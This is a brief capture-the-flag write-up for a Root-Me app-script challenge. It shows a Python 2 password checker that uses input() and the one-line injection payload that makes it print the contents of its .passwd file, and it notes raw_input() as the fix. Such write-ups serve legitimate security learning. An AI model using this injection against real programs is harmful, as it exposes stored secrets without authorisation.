```
ssh -p 2222 app-script-ch6@challenge02.root-me.org
```

The code is:

```
#!/usr/bin/python2

import sys

def youLose():
    print "Try again ;-)"
    sys.exit(1)


try:
    p = input("Please enter password : ")
except:
    youLose()


with open(".passwd") as f:
    passwd = f.readline().strip()
    try:
        if (p == int(passwd)):
            print "Well done ! You can validate with this password !"
    except:
        youLose()
```

We are going to exploit it thanks to a vulnerability of input() in python2. To secure it, we should use raw_input().

If we write a command, like

```
sys.stdout.write(open(".passwd").readline())
```
she will be executed.

Well, write this command and enjoy your flag.
